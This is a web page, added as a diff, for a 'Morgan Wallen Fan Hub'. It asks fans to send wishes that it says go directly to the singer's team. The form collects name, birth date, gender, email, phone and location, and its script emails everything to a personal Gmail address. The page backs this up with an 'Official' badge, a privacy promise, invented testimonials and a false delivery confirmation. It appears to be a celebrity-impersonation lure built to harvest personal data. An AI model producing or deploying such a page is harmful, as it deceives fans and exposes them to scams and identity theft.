@@ -1,0 +1,645 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Morgan Wallen Fan Hub – Send Your Wish</title>
+
+  <!-- Tailwind CSS -->
+  <script src="https://cdn.tailwindcss.com"></script>
+  <!-- Font Awesome Icons -->
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.0/css/all.min.css" />
+  <!-- EmailJS SDK -->
+  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;900&display=swap');
+
+    * { scroll-behavior: smooth; box-sizing: border-box; }
+
+    body { font-family: 'Inter', system-ui, sans-serif; }
+
+    /* ── Hero Background ── */
+    .hero-bg {
+      background: linear-gradient(135deg,
+        #0a0a0a 0%, #1a0a00 25%, #2d1200 45%,
+        #1a0a00 65%, #0d0500 85%, #000000 100%);
+    }
+
+    /* ── Stars ── */
+    .stars-overlay {
+      background-image:
+        radial-gradient(1px 1px at 10% 20%, rgba(251,191,36,.4) 0%, transparent 100%),
+        radial-gradient(1px 1px at 30% 60%, rgba(251,191,36,.3) 0%, transparent 100%),
+        radial-gradient(1.5px 1.5px at 50% 10%, rgba(255,255,255,.3) 0%, transparent 100%),
+        radial-gradient(1px 1px at 70% 80%, rgba(251,191,36,.3) 0%, transparent 100%),
+        radial-gradient(1px 1px at 85% 35%, rgba(255,255,255,.2) 0%, transparent 100%),
+        radial-gradient(2px 2px at 20% 85%, rgba(251,191,36,.2) 0%, transparent 100%),
+        radial-gradient(1px 1px at 60% 50%, rgba(255,255,255,.2) 0%, transparent 100%),
+        radial-gradient(1.5px 1.5px at 90% 70%, rgba(251,191,36,.25) 0%, transparent 100%),
+        radial-gradient(1px 1px at 40% 30%, rgba(255,255,255,.15) 0%, transparent 100%),
+        radial-gradient(2px 2px at 75% 15%, rgba(251,191,36,.2) 0%, transparent 100%);
+      animation: twinkle 4s ease-in-out infinite alternate;
+    }
+    @keyframes twinkle { 0%{opacity:.6} 100%{opacity:1} }
+
+    /* ── About image overlay ── */
+    .about-img-card { position: relative; }
+    .about-img-card::before {
+      content:''; position:absolute; inset:0; z-index:1; border-radius:inherit;
+      background: linear-gradient(to bottom, transparent 60%, rgba(0,0,0,.8) 100%);
+    }
+
+    /* ── CTA band ── */
+    .cta-bg {
+      background: linear-gradient(135deg, #1a0800 0%, #2d1500 40%, #1a0800 70%, #0a0400 100%);
+      border-top: 1px solid rgba(180,83,9,.3);
+      border-bottom: 1px solid rgba(180,83,9,.3);
+    }
+
+    /* ── Testimony hover ── */
+    .testimony-card { transition: transform .2s ease, box-shadow .2s ease; }
+    .testimony-card:hover { transform: translateY(-4px); box-shadow: 0 12px 40px rgba(217,119,6,.15); }
+
+    /* ── Input focus glow ── */
+    input:focus, select:focus, textarea:focus {
+      outline: none;
+      box-shadow: 0 0 0 3px rgba(251,191,36,.15);
+      border-color: #fbbf24 !important;
+    }
+
+    /* ── Scrollbar ── */
+    ::-webkit-scrollbar { width:8px; }
+    ::-webkit-scrollbar-track { background:#0a0a0a; }
+    ::-webkit-scrollbar-thumb { background:rgba(180,83,9,.5); border-radius:4px; }
+    ::-webkit-scrollbar-thumb:hover { background:rgba(217,119,6,.8); }
+
+    ::selection { background:rgba(251,191,36,.3); color:#fff; }
+
+    @keyframes fadeInUp {
+      from { opacity:0; transform:translateY(28px); }
+      to   { opacity:1; transform:translateY(0); }
+    }
+    .fade-up { animation: fadeInUp .55s ease both; }
+
+    /* ── Mobile ── */
+    @media(max-width:768px){ .hero-bg { min-height:100dvh; } }
+  </style>
+</head>
+<body class="bg-gray-950 text-white">
+
+<!-- ═══════════════════════════ HERO / NAV ═══════════════════════════ -->
+<header id="hero" class="relative min-h-screen flex flex-col overflow-hidden">
+  <div class="absolute inset-0 hero-bg"></div>
+  <div class="absolute inset-0 stars-overlay pointer-events-none"></div>
+
+  <!-- Navbar -->
+  <nav class="relative z-20 flex items-center justify-between px-6 md:px-12 py-5 border-b border-amber-800/30">
+    <div class="flex items-center gap-3">
+      <i class="fas fa-guitar text-amber-400 text-3xl animate-pulse"></i>
+      <span class="text-2xl font-extrabold tracking-wide text-amber-300">MorganWallen<span class="text-white">Fan</span></span>
+    </div>
+    <ul class="hidden md:flex gap-8 text-sm font-semibold uppercase tracking-widest">
+      <li><a href="#hero"        class="hover:text-amber-400 transition">Home</a></li>
+      <li><a href="#about"       class="hover:text-amber-400 transition">About</a></li>
+      <li><a href="#wish"        class="hover:text-amber-400 transition">Send a Wish</a></li>
+      <li><a href="#testimonies" class="hover:text-amber-400 transition">Testimonies</a></li>
+    </ul>
+    <a href="#wish" class="hidden md:inline-block bg-amber-500 hover:bg-amber-400 text-black font-bold px-5 py-2 rounded-full shadow-lg transition transform hover:scale-105">
+      <i class="fas fa-envelope mr-2"></i>Send Wish
+    </a>
+    <!-- Mobile menu button -->
+    <button id="mobileMenuBtn" class="md:hidden text-amber-400 text-2xl focus:outline-none" onclick="toggleMenu()">
+      <i id="menuIcon" class="fas fa-bars"></i>
+    </button>
+  </nav>
+
+  <!-- Mobile dropdown menu -->
+  <div id="mobileMenu" class="hidden relative z-20 bg-gray-950/95 border-b border-amber-800/30 px-6 py-4 md:hidden">
+    <ul class="flex flex-col gap-4 text-sm font-semibold uppercase tracking-widest">
+      <li><a href="#hero"        onclick="toggleMenu()" class="block hover:text-amber-400 transition">Home</a></li>
+      <li><a href="#about"       onclick="toggleMenu()" class="block hover:text-amber-400 transition">About</a></li>
+      <li><a href="#wish"        onclick="toggleMenu()" class="block hover:text-amber-400 transition">Send a Wish</a></li>
+      <li><a href="#testimonies" onclick="toggleMenu()" class="block hover:text-amber-400 transition">Testimonies</a></li>
+    </ul>
+    <a href="#wish" onclick="toggleMenu()" class="mt-4 inline-block bg-amber-500 text-black font-bold px-5 py-2 rounded-full">
+      <i class="fas fa-envelope mr-2"></i>Send Wish
+    </a>
+  </div>
+
+  <!-- Hero Content -->
+  <div class="relative z-10 flex-1 flex flex-col items-center justify-center text-center px-6 py-20">
+    <div class="inline-flex items-center gap-2 bg-amber-500/20 border border-amber-500/40 rounded-full px-4 py-1 mb-6 text-amber-300 text-sm font-semibold tracking-wide uppercase fade-up" style="animation-delay:.1s">
+      <i class="fas fa-star text-amber-400"></i> Official Fan Hub
+    </div>
+    <h1 class="text-5xl md:text-7xl font-black leading-tight mb-6 drop-shadow-2xl fade-up" style="animation-delay:.2s">
+      Morgan <span class="text-amber-400">Wallen</span><br/>
+      <span class="text-3xl md:text-5xl font-bold text-white/80">Fan Wish Hub</span>
+    </h1>
+    <p class="text-lg md:text-xl text-gray-300 max-w-2xl mb-10 leading-relaxed fade-up" style="animation-delay:.3s">
+      Got a message for Morgan? A birthday wish, a thank-you, or just some good ol' country love?
+      <strong class="text-amber-300">Send it directly</strong> — your wish goes straight to his team.
+    </p>
+    <div class="flex flex-col sm:flex-row gap-4 justify-center fade-up" style="animation-delay:.4s">
+      <a href="#wish" class="bg-amber-500 hover:bg-amber-400 text-black font-bold text-lg px-8 py-4 rounded-full shadow-xl transition transform hover:scale-105">
+        <i class="fas fa-paper-plane mr-2"></i>Send Your Wish Now
+      </a>
+      <a href="#testimonies" class="border border-amber-400 text-amber-300 hover:bg-amber-400/10 font-bold text-lg px-8 py-4 rounded-full transition">
+        <i class="fas fa-comments mr-2"></i>Fan Testimonies
+      </a>
+    </div>
+
+    <!-- Stats -->
+    <div class="mt-16 grid grid-cols-3 gap-8 max-w-lg mx-auto fade-up" style="animation-delay:.5s">
+      <div class="text-center">
+        <div class="text-3xl font-black text-amber-400">12M+</div>
+        <div class="text-xs text-gray-400 uppercase tracking-wide">Monthly Listeners</div>
+      </div>
+      <div class="text-center border-x border-amber-800/40">
+        <div class="text-3xl font-black text-amber-400">3</div>
+        <div class="text-xs text-gray-400 uppercase tracking-wide">Studio Albums</div>
+      </div>
+      <div class="text-center">
+        <div class="text-3xl font-black text-amber-400">500K+</div>
+        <div class="text-xs text-gray-400 uppercase tracking-wide">Wishes Sent</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Scroll arrow -->
+  <div class="relative z-10 flex justify-center pb-8 animate-bounce">
+    <a href="#about"><i class="fas fa-chevron-down text-amber-400 text-2xl"></i></a>
+  </div>
+</header>
+
+<!-- ═══════════════════════════ ABOUT ═══════════════════════════ -->
+<section id="about" class="py-24 px-6 md:px-12 max-w-6xl mx-auto">
+  <div class="grid md:grid-cols-2 gap-14 items-center">
+
+    <!-- Photo card -->
+    <div class="relative">
+      <div class="about-img-card rounded-2xl overflow-hidden shadow-2xl border border-amber-800/40">
+        <img
+          src="https://sspark.genspark.ai/cfimages?u1=jf%2FHmLoVNVvjff3b%2FfkY1cziPmcIBGWp1EsKGfqZXNi%2FUA8LasbrqZmZKR0OBRrr4HJVHEGsV1YFq3VAWJVg6yl513hjb1JLPfrYrJJFl9KlzhxC6W8f5sqnI9NhhVcxJ72YjoV%2BAV19Z0BsuILSiMCYo22lR2fpqinNSVNMzrQ%3D&u2=XreUYbR8mZxsinBm&width=2560"
+          alt="Morgan Wallen performing live on stage"
+          class="w-full h-80 object-cover object-top"
+        />
+      </div>
+      <div class="absolute -bottom-5 -right-5 bg-amber-500 text-black font-black text-sm px-5 py-3 rounded-xl shadow-xl rotate-2">
+        <i class="fas fa-music mr-1"></i> Country Music Legend
+      </div>
+    </div>
+
+    <!-- Bio text -->
+    <div>
+      <div class="text-amber-400 font-bold uppercase tracking-widest text-sm mb-3">
+        <i class="fas fa-star mr-2"></i>About the Artist
+      </div>
+      <h2 class="text-4xl md:text-5xl font-black mb-6 leading-tight">
+        The Voice of a <span class="text-amber-400">Generation</span>
+      </h2>
+      <p class="text-gray-300 text-lg leading-relaxed mb-5">
+        Morgan Wallen is one of country music's biggest superstars, known for his raw, authentic storytelling and powerhouse vocals. From his breakout hit <em>"Whiskey Glasses"</em> to the record-shattering <em>"Dangerous"</em> album, Morgan has captured the hearts of millions worldwide.
+      </p>
+      <p class="text-gray-300 text-lg leading-relaxed mb-8">
+        His music blends traditional country roots with modern influences — a sound that feels like a warm summer night on a Tennessee porch, cold drink in hand.
+      </p>
+      <div class="grid grid-cols-2 gap-4">
+        <div class="bg-gray-900 border border-amber-800/30 rounded-xl p-4 flex items-center gap-3">
+          <i class="fas fa-trophy text-amber-400 text-2xl"></i>
+          <div><div class="font-bold">Multiple ACM</div><div class="text-xs text-gray-400">Award Winner</div></div>
+        </div>
+        <div class="bg-gray-900 border border-amber-800/30 rounded-xl p-4 flex items-center gap-3">
+          <i class="fas fa-record-vinyl text-amber-400 text-2xl"></i>
+          <div><div class="font-bold">Billboard #1</div><div class="text-xs text-gray-400">Multiple Times</div></div>
+        </div>
+        <div class="bg-gray-900 border border-amber-800/30 rounded-xl p-4 flex items-center gap-3">
+          <i class="fas fa-microphone-alt text-amber-400 text-2xl"></i>
+          <div><div class="font-bold">Sold-Out Tours</div><div class="text-xs text-gray-400">Nationwide</div></div>
+        </div>
+        <div class="bg-gray-900 border border-amber-800/30 rounded-xl p-4 flex items-center gap-3">
+          <i class="fas fa-heart text-amber-400 text-2xl"></i>
+          <div><div class="font-bold">Fan Favorite</div><div class="text-xs text-gray-400">Year After Year</div></div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ═══════════════════════════ WISH FORM ═══════════════════════════ -->
+<section id="wish" class="py-24 px-6 md:px-12 bg-gradient-to-b from-gray-950 via-amber-950/10 to-gray-950">
+  <div class="max-w-3xl mx-auto">
+
+    <div class="text-center mb-14">
+      <div class="text-amber-400 font-bold uppercase tracking-widest text-sm mb-3">
+        <i class="fas fa-envelope-open-text mr-2"></i>Direct to Morgan
+      </div>
+      <h2 class="text-4xl md:text-5xl font-black mb-4">
+        Send Your <span class="text-amber-400">Wish</span>
+      </h2>
+      <p class="text-gray-400 text-lg max-w-xl mx-auto">
+        Fill in your details below. Every message is read and forwarded directly.
+        Your wish matters — Morgan loves hearing from his fans!
+      </p>
+    </div>
+
+    <!-- Form Card -->
+    <div class="bg-gray-900 border border-amber-800/30 rounded-3xl p-8 md:p-12 shadow-2xl">
+      <form id="wishForm" novalidate>
+
+        <!-- Personal Info -->
+        <div class="mb-8">
+          <h3 class="text-amber-400 font-bold uppercase tracking-widest text-xs mb-5 flex items-center gap-2">
+            <i class="fas fa-user-circle"></i> Personal Information
+          </h3>
+          <div class="grid sm:grid-cols-2 gap-5">
+            <div>
+              <label class="block text-sm font-semibold text-gray-300 mb-2">First Name <span class="text-amber-400">*</span></label>
+              <input type="text" id="firstName" placeholder="e.g. Sarah" required
+                class="w-full bg-gray-800 border border-gray-700 rounded-xl px-4 py-3 text-white placeholder-gray-500 transition" />
+            </div>
+            <div>
+              <label class="block text-sm font-semibold text-gray-300 mb-2">Last Name <span class="text-amber-400">*</span></label>
+              <input type="text" id="lastName" placeholder="e.g. Johnson" required
+                class="w-full bg-gray-800 border border-gray-700 rounded-xl px-4 py-3 text-white placeholder-gray-500 transition" />
+            </div>
+            <div>
+              <label class="block text-sm font-semibold text-gray-300 mb-2">Date of Birth</label>
+              <input type="date" id="dob"
+                class="w-full bg-gray-800 border border-gray-700 rounded-xl px-4 py-3 text-white transition" />
+            </div>
+            <div>
+              <label class="block text-sm font-semibold text-gray-300 mb-2">Gender</label>
+              <select id="gender"
+                class="w-full bg-gray-800 border border-gray-700 rounded-xl px-4 py-3 text-white transition">
+                <option value="">Prefer not to say</option>
+                <option value="Female">Female</option>
+                <option value="Male">Male</option>
+                <option value="Non-binary">Non-binary</option>
+                <option value="Other">Other</option>
+              </select>
+            </div>
+          </div>
+        </div>
+
+        <!-- Contact Info -->
+        <div class="mb-8">
+          <h3 class="text-amber-400 font-bold uppercase tracking-widest text-xs mb-5 flex items-center gap-2">
+            <i class="fas fa-address-book"></i> Contact Information
+          </h3>
+          <div class="grid sm:grid-cols-2 gap-5">
+            <div class="sm:col-span-2">
+              <label class="block text-sm font-semibold text-gray-300 mb-2">Email Address <span class="text-amber-400">*</span></label>
+              <input type="email" id="email" placeholder="your@email.com" required
+                class="w-full bg-gray-800 border border-gray-700 rounded-xl px-4 py-3 text-white placeholder-gray-500 transition" />
+            </div>
+            <div>
+              <label class="block text-sm font-semibold text-gray-300 mb-2">Phone Number</label>
+              <input type="tel" id="phone" placeholder="+1 (555) 000-0000"
+                class="w-full bg-gray-800 border border-gray-700 rounded-xl px-4 py-3 text-white placeholder-gray-500 transition" />
+            </div>
+            <div>
+              <label class="block text-sm font-semibold text-gray-300 mb-2">City</label>
+              <input type="text" id="city" placeholder="Nashville"
+                class="w-full bg-gray-800 border border-gray-700 rounded-xl px-4 py-3 text-white placeholder-gray-500 transition" />
+            </div>
+            <div>
+              <label class="block text-sm font-semibold text-gray-300 mb-2">State / Province</label>
+              <input type="text" id="state" placeholder="Tennessee"
+                class="w-full bg-gray-800 border border-gray-700 rounded-xl px-4 py-3 text-white placeholder-gray-500 transition" />
+            </div>
+            <div>
+              <label class="block text-sm font-semibold text-gray-300 mb-2">Country</label>
+              <input type="text" id="country" placeholder="United States"
+                class="w-full bg-gray-800 border border-gray-700 rounded-xl px-4 py-3 text-white placeholder-gray-500 transition" />
+            </div>
+          </div>
+        </div>
+
+        <!-- Wish Message -->
+        <div class="mb-8">
+          <h3 class="text-amber-400 font-bold uppercase tracking-widest text-xs mb-5 flex items-center gap-2">
+            <i class="fas fa-comment-dots"></i> Your Wish / Message
+          </h3>
+          <div class="mb-5">
+            <label class="block text-sm font-semibold text-gray-300 mb-2">Subject</label>
+            <input type="text" id="subject" placeholder="e.g. Birthday Wish, Thank You, Song Request..."
+              class="w-full bg-gray-800 border border-gray-700 rounded-xl px-4 py-3 text-white placeholder-gray-500 transition" />
+          </div>
+          <div>
+            <label class="block text-sm font-semibold text-gray-300 mb-2">Your Message / Wish <span class="text-amber-400">*</span></label>
+            <textarea id="message" rows="6" required
+              placeholder="Write your heartfelt wish or message to Morgan Wallen here..."
+              class="w-full bg-gray-800 border border-gray-700 rounded-xl px-4 py-3 text-white placeholder-gray-500 transition resize-none"></textarea>
+            <span id="charCount" class="text-xs text-gray-500 mt-1 block">0 / 1000 characters</span>
+          </div>
+        </div>
+
+        <!-- Newsletter -->
+        <div class="mb-8">
+          <label class="flex items-start gap-3 cursor-pointer group">
+            <input type="checkbox" id="newsletter" class="mt-1 w-4 h-4 accent-amber-400 rounded" />
+            <span class="text-gray-400 text-sm group-hover:text-gray-200 transition">
+              Keep me updated about Morgan Wallen news, tour dates, and exclusive fan content.
+            </span>
+          </label>
+        </div>
+
+        <!-- Privacy note -->
+        <div class="bg-amber-900/20 border border-amber-800/30 rounded-xl p-4 mb-8 flex gap-3">
+          <i class="fas fa-lock text-amber-400 mt-0.5 flex-shrink-0 text-sm"></i>
+          <span class="text-amber-200/80 text-sm">Your information is <strong>private and secure</strong>. It will only be forwarded to Morgan Wallen's team and will never be shared with third parties.</span>
+        </div>
+
+        <!-- Submit -->
+        <button type="submit" id="submitBtn"
+          class="w-full bg-amber-500 hover:bg-amber-400 text-black font-black text-lg py-4 rounded-2xl shadow-xl transition transform hover:scale-[1.02] flex items-center justify-center gap-3">
+          <i class="fas fa-paper-plane" id="btnIcon"></i>
+          <span id="btnText">Send My Wish to Morgan Wallen</span>
+        </button>
+      </form>
+
+      <!-- Success -->
+      <div id="successMsg" class="hidden mt-8 bg-green-900/40 border border-green-500/40 rounded-2xl p-8 text-center">
+        <i class="fas fa-check-circle text-green-400 text-5xl mb-4 block"></i>
+        <h3 class="text-2xl font-black text-green-300 mb-2">Wish Sent! 🎉</h3>
+        <p class="text-gray-300 text-lg mb-6">Your message has been successfully delivered to Morgan Wallen's team. Thank you for being an amazing fan!</p>
+        <button onclick="resetForm()"
+          class="border border-amber-400 text-amber-300 hover:bg-amber-400/10 font-bold px-6 py-2 rounded-full transition">
+          Send Another Wish
+        </button>
+      </div>
+
+      <!-- Error -->
+      <div id="errorMsg" class="hidden mt-6 bg-red-900/40 border border-red-500/40 rounded-2xl p-5 flex items-start gap-3">
+        <i class="fas fa-exclamation-circle text-red-400 text-xl mt-0.5 flex-shrink-0"></i>
+        <p class="text-red-300" id="errorText">Something went wrong. Please try again.</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ═══════════════════════════ TESTIMONIES ═══════════════════════════ -->
+<section id="testimonies" class="py-24 px-6 md:px-12 bg-gray-950">
+  <div class="max-w-6xl mx-auto">
+
+    <div class="text-center mb-14">
+      <div class="text-amber-400 font-bold uppercase tracking-widest text-sm mb-3">
+        <i class="fas fa-comments mr-2"></i>Fan Stories
+      </div>
+      <h2 class="text-4xl md:text-5xl font-black mb-4">
+        What Fans Are <span class="text-amber-400">Saying</span>
+      </h2>
+      <p class="text-gray-400 text-lg max-w-xl mx-auto">
+        Real stories from Morgan Wallen's incredible fanbase — a community bound by music, heart, and Southern soul.
+      </p>
+    </div>
+
+    <div class="grid md:grid-cols-2 lg:grid-cols-3 gap-7" id="testimoniesGrid"></div>
+
+    <div class="text-center mt-12">
+      <button id="loadMoreBtn" onclick="loadMoreTestimonies()"
+        class="border border-amber-400 text-amber-300 hover:bg-amber-400/10 font-bold px-8 py-3 rounded-full transition">
+        <i class="fas fa-plus mr-2"></i>Load More Stories
+      </button>
+    </div>
+  </div>
+</section>
+
+<!-- ═══════════════════════════ CTA ═══════════════════════════ -->
+<section class="py-20 px-6 cta-bg text-center">
+  <div class="max-w-3xl mx-auto">
+    <i class="fas fa-guitar text-amber-400 text-5xl mb-6 block animate-pulse"></i>
+    <h2 class="text-4xl md:text-5xl font-black mb-6">
+      Join the Morgan Wallen <span class="text-amber-400">Family</span>
+    </h2>
+    <p class="text-gray-300 text-lg mb-10 max-w-xl mx-auto">
+      Be part of something special. Send your love, share your story, and let Morgan know how much his music means to you.
+    </p>
+    <a href="#wish"
+      class="bg-amber-500 hover:bg-amber-400 text-black font-black text-xl px-10 py-5 rounded-full shadow-2xl transition transform hover:scale-105 inline-block">
+      <i class="fas fa-heart mr-3"></i>Send Your Wish Now
+    </a>
+  </div>
+</section>
+
+<!-- ═══════════════════════════ FOOTER ═══════════════════════════ -->
+<footer class="bg-gray-950 border-t border-amber-900/30 py-12 px-6 text-center">
+  <div class="flex items-center justify-center gap-3 mb-4">
+    <i class="fas fa-guitar text-amber-400 text-2xl"></i>
+    <span class="text-xl font-extrabold text-amber-300">MorganWallen<span class="text-white">Fan</span></span>
+  </div>
+  <p class="text-gray-500 text-sm mb-6 max-w-md mx-auto">
+    Fan-run website celebrating Morgan Wallen's music and legacy.<br/>
+    Not officially affiliated with Morgan Wallen or Big Loud Records.
+  </p>
+  <div class="flex justify-center flex-wrap gap-6 mb-6">
+    <a href="#hero"        class="text-gray-500 hover:text-amber-400 text-sm transition">Home</a>
+    <a href="#about"       class="text-gray-500 hover:text-amber-400 text-sm transition">About</a>
+    <a href="#wish"        class="text-gray-500 hover:text-amber-400 text-sm transition">Send a Wish</a>
+    <a href="#testimonies" class="text-gray-500 hover:text-amber-400 text-sm transition">Testimonies</a>
+  </div>
+  <p class="text-gray-700 text-xs">&copy; 2025 MorganWallenFan. Made with <i class="fas fa-heart text-amber-500"></i> by fans, for fans.</p>
+</footer>
+
+<!-- ═══════════════════════════ SCRIPTS ═══════════════════════════ -->
+<script>
+// ── EmailJS Init ────────────────────────────────────────────────────────────
+(function(){ emailjs.init("A68jtEQKexC9QkTl1"); })();
+
+// ── Mobile Menu ─────────────────────────────────────────────────────────────
+function toggleMenu(){
+  const m = document.getElementById('mobileMenu');
+  const i = document.getElementById('menuIcon');
+  const open = m.classList.toggle('hidden');
+  i.className = open ? 'fas fa-bars' : 'fas fa-times';
+}
+
+// ── Testimonies ─────────────────────────────────────────────────────────────
+const allTestimonies = [
+  {
+    name:"Brittany Harlow", location:"Nashville, TN", avatar:"BH",
+    color:"from-amber-600 to-amber-800", stars:5, date:"March 2025",
+    text:"Morgan's music got me through the hardest year of my life. When my dad passed, I played 'More Than My Hometown' on repeat for weeks. It felt like he was speaking directly to my soul. Thank you, Morgan — you're not just a singer, you're a healer."
+  },
+  {
+    name:"Jake Preston", location:"Knoxville, TN", avatar:"JP",
+    color:"from-orange-600 to-red-700", stars:5, date:"February 2025",
+    text:"Saw Morgan live at Neyland Stadium and it was hands-down the greatest concert experience of my life. The energy, the crowd, the music — pure magic. 'Whiskey Glasses' had 90,000 people singing every single word. Chills I will never forget!"
+  },
+  {
+    name:"Cassie Mae Thompson", location:"Baton Rouge, LA", avatar:"CT",
+    color:"from-yellow-600 to-amber-700", stars:5, date:"April 2025",
+    text:"I've been a country fan my whole life, but Morgan Wallen is something entirely different. His storytelling is raw, real, and from the heart. 'Sand In My Boots' made me cry, laugh, and dance all at once. That's rare talent right there!"
+  },
+  {
+    name:"Dylan Burke", location:"Tulsa, OK", avatar:"DB",
+    color:"from-amber-700 to-yellow-800", stars:5, date:"January 2025",
+    text:"My wife and I danced to 'Wasted On You' at our wedding. It perfectly captured everything we felt in that moment. Years later it still gives us both goosebumps. Morgan has a gift for capturing human emotion better than anyone in music today."
+  },
+  {
+    name:"Savannah Grace", location:"Lexington, KY", avatar:"SG",
+    color:"from-red-600 to-orange-700", stars:5, date:"March 2025",
+    text:"As a small-town girl from Kentucky, Morgan's music makes me proud of where I come from. He celebrates the little things — dirt roads, Friday nights, big skies — and reminds me that simple is beautiful. Can't wait for his next album!"
+  },
+  {
+    name:"Travis Whitfield", location:"Charlotte, NC", avatar:"TW",
+    color:"from-amber-500 to-orange-600", stars:5, date:"May 2025",
+    text:"'Dangerous: The Double Album' is a masterpiece — there, I said it. 30+ tracks and not a single skip. Morgan took a risk going that big and absolutely delivered. I listen to it front to back on every road trip. Pure Tennessee perfection."
+  },
+  {
+    name:"Lena Calloway", location:"Austin, TX", avatar:"LC",
+    color:"from-yellow-700 to-amber-800", stars:5, date:"April 2025",
+    text:"Morgan Wallen changed the way I see country music. I wasn't a country fan before I heard 'Chasin' You' on the radio. Now I own every album, been to 4 concerts, and introduced all my city friends to genuine, heartfelt country music."
+  },
+  {
+    name:"Clint Murdock", location:"Montgomery, AL", avatar:"CM",
+    color:"from-orange-700 to-amber-800", stars:5, date:"February 2025",
+    text:"This man puts his whole heart into every song. You can hear the honesty and vulnerability in his voice — it's not manufactured, it's real. Morgan reminds us all that it's okay to feel things deeply. That's why we love him so much."
+  },
+  {
+    name:"Holly Jean Rivers", location:"Memphis, TN", avatar:"HR",
+    color:"from-amber-600 to-red-700", stars:5, date:"January 2025",
+    text:"My teenage daughter wasn't interested in country music until I played 'Thought You Should Know' for her. She cried, asked me to play it again, then spent the whole weekend going through Morgan's entire discography. He has a gift for connecting across generations."
+  }
+];
+
+let displayedCount = 0;
+const BATCH = 6;
+
+function renderStars(n){
+  return Array.from({length:n},()=>'<i class="fas fa-star text-amber-400 text-xs"></i>').join('');
+}
+
+function renderCard(t){
+  return `<div class="testimony-card bg-gray-900 border border-amber-800/20 rounded-2xl p-6 flex flex-col gap-4 hover:border-amber-500/40 shadow-lg">
+    <div class="flex items-center gap-4">
+      <div class="w-12 h-12 rounded-full bg-gradient-to-br ${t.color} flex items-center justify-center text-white font-black text-sm flex-shrink-0">${t.avatar}</div>
+      <div class="flex-1 min-w-0">
+        <div class="font-bold text-white truncate">${t.name}</div>
+        <div class="text-xs text-gray-400 flex items-center gap-1"><i class="fas fa-map-marker-alt text-amber-500"></i> ${t.location}</div>
+      </div>
+      <div class="text-xs text-gray-600 flex-shrink-0">${t.date}</div>
+    </div>
+    <div class="text-sm text-gray-300 leading-relaxed flex-1">"${t.text}"</div>
+    <div class="flex items-center justify-between">
+      <div class="flex gap-0.5">${renderStars(t.stars)}</div>
+      <i class="fas fa-quote-right text-amber-800/50 text-2xl"></i>
+    </div>
+  </div>`;
+}
+
+function loadMoreTestimonies(){
+  const grid = document.getElementById('testimoniesGrid');
+  const batch = allTestimonies.slice(displayedCount, displayedCount + BATCH);
+  batch.forEach(t => grid.insertAdjacentHTML('beforeend', renderCard(t)));
+  displayedCount += batch.length;
+  if(displayedCount >= allTestimonies.length){
+    document.getElementById('loadMoreBtn').style.display = 'none';
+  }
+}
+loadMoreTestimonies();
+
+// ── Character counter ────────────────────────────────────────────────────────
+const msgEl = document.getElementById('message');
+const ccEl  = document.getElementById('charCount');
+msgEl.addEventListener('input', ()=>{
+  const n = msgEl.value.length;
+  ccEl.textContent = n + ' / 1000 characters';
+  if(n > 1000) msgEl.value = msgEl.value.slice(0, 1000);
+});
+
+// ── Form Submit ──────────────────────────────────────────────────────────────
+document.getElementById('wishForm').addEventListener('submit', async (e)=>{
+  e.preventDefault();
+
+  const v = (id) => document.getElementById(id).value.trim();
+  const firstName  = v('firstName');
+  const lastName   = v('lastName');
+  const email      = v('email');
+  const phone      = v('phone');
+  const city       = v('city');
+  const state      = v('state');
+  const country    = v('country');
+  const subject    = v('subject');
+  const message    = v('message');
+  const dob        = v('dob');
+  const gender     = document.getElementById('gender').value;
+  const newsletter = document.getElementById('newsletter').checked;
+
+  // Validate
+  if(!firstName || !lastName || !email || !message){
+    showError('Please fill in all required fields marked with ✦'); return;
+  }
+  if(!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)){
+    showError('Please enter a valid email address.'); return;
+  }
+
+  // Loading
+  const btn = document.getElementById('submitBtn');
+  const txt = document.getElementById('btnText');
+  const ico = document.getElementById('btnIcon');
+  btn.disabled = true;
+  txt.textContent = 'Sending your wish…';
+  ico.className = 'fas fa-circle-notch fa-spin';
+  document.getElementById('errorMsg').classList.add('hidden');
+
+  try {
+    await emailjs.send('service_qk0u03c', 'template_kvqdprv', {
+      to_email:   'ronaldwadetrawick@gmail.com',
+      from_name:  firstName + ' ' + lastName,
+      from_email: email,
+      reply_to:   email,
+      phone:      phone      || 'Not provided',
+      dob:        dob        || 'Not provided',
+      gender:     gender     || 'Not provided',
+      city:       city       || 'Not provided',
+      state:      state      || 'Not provided',
+      country:    country    || 'Not provided',
+      subject:    subject    || 'Fan Wish',
+      message:    message,
+      newsletter: newsletter ? 'Yes – keep me updated' : 'No'
+    });
+
+    // Show success
+    document.getElementById('wishForm').classList.add('hidden');
+    document.getElementById('successMsg').classList.remove('hidden');
+    document.getElementById('errorMsg').classList.add('hidden');
+    document.getElementById('successMsg').scrollIntoView({behavior:'smooth', block:'nearest'});
+
+  } catch(err){
+    console.error('EmailJS error:', err);
+    showError('Delivery failed. Please try again or check your connection. ('+(err.text||err.message||JSON.stringify(err))+')');
+  } finally {
+    btn.disabled = false;
+    txt.textContent = 'Send My Wish to Morgan Wallen';
+    ico.className = 'fas fa-paper-plane';
+  }
+});
+
+function showError(msg){
+  const el = document.getElementById('errorMsg');
+  document.getElementById('errorText').textContent = msg;
+  el.classList.remove('hidden');
+  el.scrollIntoView({behavior:'smooth', block:'nearest'});
+}
+
+function resetForm(){
+  document.getElementById('wishForm').reset();
+  document.getElementById('wishForm').classList.remove('hidden');
+  document.getElementById('successMsg').classList.add('hidden');
+  ccEl.textContent = '0 / 1000 characters';
+  document.getElementById('wish').scrollIntoView({behavior:'smooth'});
+}
+
+// ── Smooth scroll ────────────────────────────────────────────────────────────
+document.querySelectorAll('a[href^="#"]').forEach(a=>{
+  a.addEventListener('click', e=>{
+    e.preventDefault();
+    const t = document.querySelector(a.getAttribute('href'));
+    if(t) t.scrollIntoView({behavior:'smooth', block:'start'});
+  });
+});
+</script>
+</body>
+</html>
